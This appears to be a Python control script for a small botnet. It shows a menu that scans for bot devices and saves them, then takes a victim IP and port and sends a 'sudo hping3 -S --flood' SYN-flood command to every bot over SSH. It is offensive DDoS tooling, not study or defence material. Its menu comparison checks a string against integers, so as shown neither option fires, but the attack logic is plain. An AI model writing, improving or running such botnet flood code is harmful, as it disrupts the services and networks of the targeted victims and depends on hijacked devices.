from scan_device import Scanbot
import sys
import re
import os
import socket
import time
from multiprocessing import Process
from rwList import RW
from command import Command
import argparse
from sshParallel import SSHtoBotnet

# parser = argparse.ArgumentParser()
# parser.add_argument('-t','--target', help='Destination address', required=True)
# parser.add_argument('-p', '--port', help='Destination Port number', type=int, required=True)
# args = parser.parse_args()

def menu():
    print('1. Scan bot')
    print('2. Start attack')
    i = input('Select: ')
    return i
while True:
    c = menu()
    if c == 1:
        listip = Scanbot.scan()
        Scanbot.display_result(listip)
        RW.saveBot(listip)
    elif c == 2:
        ip = input('IP Victim: ')
        port = input('Port Victim: ')

        command = 'sudo hping3 -S --flood -V ' + ip + ' -p '+ port
        SSHtoBotnet.C2(command)



